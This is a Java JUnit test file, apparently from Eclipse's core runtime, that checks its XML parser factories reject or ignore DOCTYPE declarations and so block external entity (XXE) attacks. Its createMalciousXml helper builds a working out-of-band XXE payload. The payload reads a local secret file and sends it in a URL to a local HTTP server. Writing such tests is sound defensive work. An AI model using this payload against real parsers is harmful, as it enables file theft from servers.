/*******************************************************************************
 *  Copyright (c) 2023 Joerg Kubitz and others.
 *
 *  This program and the accompanying materials
 *  are made available under the terms of the Eclipse Public License 2.0
 *  which accompanies this distribution, and is available at
 *  https://www.eclipse.org/legal/epl-2.0/
 *
 *  SPDX-License-Identifier: EPL-2.0
 *******************************************************************************/
package org.eclipse.core.tests.runtime;

import static org.hamcrest.CoreMatchers.containsString;
import static org.hamcrest.CoreMatchers.not;
import static org.hamcrest.CoreMatchers.startsWith;
import static org.hamcrest.MatcherAssert.assertThat;
import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertTrue;
import static org.junit.Assert.fail;

import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;
import java.net.URI;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.function.IntFunction;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.SAXParser;
import javax.xml.transform.Result;
import javax.xml.transform.Source;
import javax.xml.transform.Transformer;
import javax.xml.transform.TransformerException;
import javax.xml.transform.TransformerFactory;
import javax.xml.transform.stream.StreamResult;
import javax.xml.transform.stream.StreamSource;
import org.eclipse.core.internal.runtime.XmlProcessorFactory;
import org.junit.Rule;
import org.junit.Test;
import org.junit.rules.TemporaryFolder;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.xml.sax.InputSource;
import org.xml.sax.SAXException;
import org.xml.sax.SAXParseException;
import org.xml.sax.helpers.DefaultHandler;

@SuppressWarnings("restriction")
public class XmlProcessorFactoryTest {

	@Rule
	public TemporaryFolder tempFolder = new TemporaryFolder();

	@Test
	public void testParseXmlWithExternalEntity() throws Exception {
		SAXParser parser = XmlProcessorFactory.createSAXParserWithErrorOnDOCTYPE();
		try {
			testParseXmlWithExternalEntity(parser, this::createMalciousXml);
			assertTrue("SAXParseException expected", false);
		} catch (SAXParseException e) {
			String message = e.getMessage();
			assertTrue(message, message.contains("DOCTYPE"));
			assertTrue(message, message.contains("http://apache.org/xml/features/disallow-doctype-decl"));
		}
	}
	@Test
	public void testParseXmlWithExternalEntity2() throws Exception {
		SAXParser parser = XmlProcessorFactory.createSAXParserWithErrorOnDOCTYPE();
		try {
			testParseXmlWithExternalEntity(parser, this::createMalciousXml2);
			assertTrue("SAXParseException expected", false);
		} catch (SAXParseException e) {
			String message = e.getMessage();
			assertTrue(message, message.contains("DOCTYPE"));
			assertTrue(message, message.contains("http://apache.org/xml/features/disallow-doctype-decl"));
		}
	}

	@Test
	public void testParseXmlWithoutExternalEntity() throws Exception {
		SAXParser parser = XmlProcessorFactory.createSAXParserWithErrorOnDOCTYPE();
		testParseXmlWithExternalEntity(parser, this::createNormalXml);
	}

	@Test
	public void testParseXmlWithIgnoredExternalEntity() throws Exception {
		SAXParser parser = XmlProcessorFactory.createSAXParserIgnoringDOCTYPE();
		testParseXmlWithExternalEntity(parser, this::createMalciousXml);
	}

	@Test
	public void testParseXmlWithIgnoredExternalEntity2() throws Exception {
		SAXParser parser = XmlProcessorFactory.createSAXParserIgnoringDOCTYPE();
		testParseXmlWithExternalEntity(parser, this::createMalciousXml2);
	}

	@Test
	public void testParseXmlWithoutIgnoredExternalEntity() throws Exception {
		SAXParser parser = XmlProcessorFactory.createSAXParserIgnoringDOCTYPE();
		testParseXmlWithExternalEntity(parser, this::createNormalXml);
	}

	public void testParseXmlWithExternalEntity(SAXParser parser, IntFunction<InputStream> xmlSupplier)
			throws Exception {
		try (Server httpServerThread = new Server()) {
			List<String> elements = new ArrayList<>();
			DefaultHandler handler = new DefaultHandler() {
				@Override
				public void startElement(String uri, String localName, String qName,
						org.xml.sax.Attributes attributes) {
					elements.add(qName);
				}

				@Override
				public void characters(char ch[], int start, int length) {
					String content = new String(ch, start, length);
					assertFalse("Secret was injected into xml: " + content, content.contains("secret")); // var4
				}

				@Override
				public InputSource resolveEntity(String publicId, String systemId) throws SAXException {
					// implementation that would do any remote call:
					try {
						return new InputSource(URI.create(systemId).toURL().openStream());
					} catch (IOException exception) {
						throw new SAXException(exception);
					}
					// Also the default impl injects files:
					// return null;

					// Does also prevent access to external files:
					// return new InputSource(new StringReader(""));
				}

			};
			try (InputStream xmlStream = xmlSupplier.apply(httpServerThread.getLocalPort())) {
				parser.parse(xmlStream, handler);
			}
			assertEquals(List.of("Body"), elements);
		}
	}

	@Test
	public void testDocumentBuilderXmlWithExternalEntity() throws Exception {
		DocumentBuilder documentBuilder = XmlProcessorFactory.createDocumentBuilderWithErrorOnDOCTYPE();
		try {
			testParseXmlWithExternalEntity(documentBuilder, this::createMalciousXml);
			assertTrue("SAXParseException expected", false);
		} catch (SAXParseException e) {
			String message = e.getMessage();
			assertTrue(message, message.contains("DOCTYPE"));
		}
	}

	@Test
	public void testDocumentBuilderXmlWithExternalEntity2() throws Exception {
		DocumentBuilder documentBuilder = XmlProcessorFactory.createDocumentBuilderWithErrorOnDOCTYPE();
		try {
			testParseXmlWithExternalEntity(documentBuilder, this::createMalciousXml2);
			assertTrue("SAXParseException expected", false);
		} catch (SAXParseException e) {
			String message = e.getMessage();
			assertTrue(message, message.contains("DOCTYPE"));
		}
	}

	@Test
	public void testDocumentBuilderFactoryWithoutExternalEntity() throws Exception {
		DocumentBuilderFactory documentBuilderFactory = XmlProcessorFactory.createDocumentBuilderFactoryWithErrorOnDOCTYPE();
		testParseXmlWithExternalEntity(documentBuilderFactory.newDocumentBuilder(), this::createNormalXml);
	}

	@Test
	public void testDocumentBuilderWithoutExternalEntity() throws Exception {
		DocumentBuilder documentBuilder = XmlProcessorFactory.createDocumentBuilderWithErrorOnDOCTYPE();
		testParseXmlWithExternalEntity(documentBuilder, this::createNormalXml);
	}

	@Test
	public void testDocumentBuilderFactoryIgnoringDoctypeNormal() throws Exception {
		DocumentBuilderFactory documentBuilderFactory = XmlProcessorFactory.createDocumentBuilderFactoryIgnoringDOCTYPE();
		testParseXmlWithExternalEntity(documentBuilderFactory.newDocumentBuilder(), this::createNormalXml);
	}

	@Test
	public void testDocumentBuilderFactoryIgnoringDoctypeMalcious() throws Exception {
		DocumentBuilderFactory documentBuilderFactory = XmlProcessorFactory.createDocumentBuilderFactoryIgnoringDOCTYPE();
		testParseXmlWithExternalEntity(documentBuilderFactory.newDocumentBuilder(), this::createMalciousXml);
	}

	@Test
	public void testDocumentBuilderFactoryIgnoringDoctypeMalcious2() throws Exception {
		DocumentBuilderFactory documentBuilderFactory = XmlProcessorFactory
				.createDocumentBuilderFactoryIgnoringDOCTYPE();
		DocumentBuilder builder = documentBuilderFactory.newDocumentBuilder();
		builder.setEntityResolver((publicId, systemId) -> new InputSource(new ByteArrayInputStream(new byte[0])));
		testParseXmlWithExternalEntity(builder, this::createMalciousXml2);
	}

	@Test
	public void testDocumentBuilderIgnoringDoctypeNormal() throws Exception {
		testParseXmlWithExternalEntity(XmlProcessorFactory.createDocumentBuilderIgnoringDOCTYPE(),
				this::createNormalXml);
	}

	@Test
	public void testDocumentBuilderIgnoringDoctypeMalcious() throws Exception {
		testParseXmlWithExternalEntity(XmlProcessorFactory.createDocumentBuilderIgnoringDOCTYPE(),
				this::createMalciousXml);
	}

	@Test
	public void testDocumentBuilderIgnoringDoctypeMalcious2() throws Exception {
		testParseXmlWithExternalEntity(XmlProcessorFactory.createDocumentBuilderIgnoringDOCTYPE(),
				this::createMalciousXml2);
	}

	public void testParseXmlWithExternalEntity(DocumentBuilder builder, IntFunction<InputStream> xmlSupplier)
			throws Exception {
		try (Server httpServerThread = new Server()) {
			Document document;

			try (InputStream xmlStream = xmlSupplier.apply(httpServerThread.getLocalPort())) {
				String s = new String(xmlStream.readAllBytes(), StandardCharsets.UTF_8);
				System.out.println(s);
				document = builder.parse(new ByteArrayInputStream(s.getBytes(StandardCharsets.UTF_8)));
			}
			Element root = document.getDocumentElement();

			assertEquals("Body", root.getTagName());
			if (root.getChildNodes().getLength() > 0) {
				String value = root.getChildNodes().item(0).getNodeValue();
				assertFalse("Parser injected secret: " + value, value.contains("secret"));
			}
		}
	}

	@Test
	public void testTransformXmlWithExternalEntity() throws Exception {
		TransformerFactory transformerFactory = XmlProcessorFactory.createTransformerFactoryWithErrorOnDOCTYPE();
		try {
			testParseXmlWithExternalEntity(transformerFactory, this::createMalciousXml);
			assertTrue("TransformerException expected", false);
		} catch (TransformerException e) {
			String message = e.getMessage();
			assertTrue(message, message.contains("DTD"));
		}
	}

	@Test
	public void testTransformXmlWithExternalEntity2() throws Exception {
		TransformerFactory transformerFactory = XmlProcessorFactory.createTransformerFactoryWithErrorOnDOCTYPE();
		try {
			testParseXmlWithExternalEntity(transformerFactory, this::createMalciousXml2);
			assertTrue("TransformerException expected", false);
		} catch (TransformerException e) {
			String message = e.getMessage();
			assertTrue(message, message.contains("DTD"));
		}
	}

	@Test
	public void testTransformXmlWithoutExternalEntity() throws Exception {
		TransformerFactory transformerFactory = XmlProcessorFactory.createTransformerFactoryWithErrorOnDOCTYPE();
		testParseXmlWithExternalEntity(transformerFactory, this::createNormalXml);
	}

	public void testParseXmlWithExternalEntity(TransformerFactory transformerFactory,
			IntFunction<InputStream> xmlSupplier) throws Exception {
		try (Server httpServerThread = new Server()) {
			String formatted;

			try (InputStream xmlStream = xmlSupplier.apply(httpServerThread.getLocalPort())) {
				Transformer xformer = transformerFactory.newTransformer();
				Source source = new StreamSource(xmlStream);
				try (ByteArrayOutputStream outputStream = new ByteArrayOutputStream()) {
					Result result = new StreamResult(outputStream);
					xformer.transform(source, result);
					formatted = outputStream.toString(StandardCharsets.UTF_8);
				}
			}
			assertTrue(formatted, formatted.contains("<Body>"));
			assertFalse("Formatter injected secret: " + formatted, formatted.contains("secret"));
		}
	}

	private InputStream createMalciousXml(int localPort) {
		//
		try {
			Path tempSecret = tempFolder.newFile("test.txt").toPath();
			Files.writeString(tempSecret, "secret");
			Path tempDtd = tempFolder.newFile("test.dtd").toPath();
			URL secretURL = tempSecret.toUri().toURL();
			String dtdContent = "<!ENTITY % var1 SYSTEM \"" + secretURL + "\">\n" //
					+ "<!ENTITY var4 SYSTEM \"" + secretURL + "\">\n" //
					+ "<!ENTITY % var2 \"<!ENTITY var3 SYSTEM 'http://localhost:" + localPort + "/?%var1;'>\">\n" //
					+ "%var2;\n";
			Files.writeString(tempDtd, dtdContent);
			URL dtdURL = tempDtd.toUri().toURL();
			String xml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" //
					+ "<!DOCTYPE var1 SYSTEM \"" + dtdURL + "\">\n" //
					+ "<Body>&var3;&var4;</Body>";
			return new ByteArrayInputStream(xml.getBytes(StandardCharsets.UTF_8));
		} catch (IOException e) {
			throw new RuntimeException(e);
		}
	}

	private InputStream createMalciousXml2(int localPort) {
		// remote DTD - can't send secret but instructs to contact remote server
		String xml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" //
				+ "<!DOCTYPE plist PUBLIC \"test\" \"http://localhost:" + localPort + "/hello\">\n" //
				+ "<Body></Body>";
		return new ByteArrayInputStream(xml.getBytes(StandardCharsets.UTF_8));
	}
	private InputStream createNormalXml(int localPort) {
		String xml = """
				<?xml version="1.0" encoding="UTF-8"?>
				<Body>hello</Body>""";
		return new ByteArrayInputStream(xml.getBytes(StandardCharsets.UTF_8));
	}

	public static final class Server implements AutoCloseable {
		private final ServerSocket serverSocket;
		private final Thread httpServerThread;
		private final Collection<Throwable> exceptionsInOtherThreads = new ConcurrentLinkedQueue<>();

		private Server() throws IOException {
			serverSocket = new ServerSocket(0);
			httpServerThread = new Thread("httpServerThread") {
				@Override
				public void run() {
					try (Socket socket = serverSocket.accept()) {
						try (BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()))) {
							String firstLine = in.readLine();
							System.out.println(socket.getInetAddress() + ": " + firstLine);
							try (OutputStream outputStream = socket.getOutputStream()) {
								outputStream.write("HTTP/1.1 200 OK\r\n".getBytes(StandardCharsets.UTF_8));
							}
							assertThat(firstLine, startsWith("GET"));
							assertThat(firstLine, not(containsString("secret")));
							fail("Server was contacted");
						}
					} catch (SocketException closed) {
						// expected
					} catch (Throwable e) {
						exceptionsInOtherThreads.add(e);
					}
				}
			};

			httpServerThread.start();
		}

		@Override
		public void close() throws Exception {
			serverSocket.close(); // -> SocketException in httpServerThread
			httpServerThread.join(5000);
			assertFalse(httpServerThread.isAlive());
			for (Throwable e : exceptionsInOtherThreads) {
				throw new AssertionError(e.getMessage(), e);
			}
		}

		public int getLocalPort() {
			return serverSocket.getLocalPort();
		}

		/** Example Server that will log and quit when contacted **/
		public static void main(String[] args) throws Exception {
			try (Server server = new Server()) {
				System.out.println("Server startet on port: " + server.getLocalPort());
				server.httpServerThread.join();
			}
		}
	}

	static volatile Object sink;

	/**
	 * Simple performance demonstration: It's slow to create Factory but 100
	 * times faster to create a Parser.
	 **/
	public static void main(String[] args) throws Exception {
		for (int i = 1; i < 1000; i++) {
			long n0 = System.nanoTime();
			sink = XmlProcessorFactory.createSAXParserIgnoringDOCTYPE();
			long n1 = System.nanoTime();
			System.out.println("createSAXParserIgnoringDOCTYPE run " + i + ": " + (n1 - n0) + "ns");
			// ~ run 999: 60000ns =0,06ms

			n0 = System.nanoTime();
			sink = XmlProcessorFactory.createDocumentBuilderFactoryWithErrorOnDOCTYPE();
			n1 = System.nanoTime();
			System.out.println("createDocumentBuilderFactoryWithErrorOnDOCTYPE run " + i + ": " + (n1 - n0) + "ns");
			// ~ run 999: 5000000ns =5ms

			n0 = System.nanoTime();
			sink = XmlProcessorFactory.createDocumentBuilderIgnoringDOCTYPE();
			n1 = System.nanoTime();
			System.out.println("createDocumentBuilderIgnoringDOCTYPE run " + i + ": " + (n1 - n0) + "ns");
			// ~ run 999: 40000ns =0,04ms

			n0 = System.nanoTime();
			sink = XmlProcessorFactory.createDocumentBuilderWithErrorOnDOCTYPE();
			n1 = System.nanoTime();
			System.out.println("createDocumentBuilderWithErrorOnDOCTYPE run " + i + ": " + (n1 - n0) + "ns");
			// ~ run 999: 30000ns =0,03ms

			n0 = System.nanoTime();
			sink = XmlProcessorFactory.createTransformerFactoryWithErrorOnDOCTYPE();
			n1 = System.nanoTime();
			System.out.println("createTransformerFactoryWithErrorOnDOCTYPE run " + i + ": " + (n1 - n0) + "ns");
			// ~ run 999: 5000000ns =5ms
		}
	}
}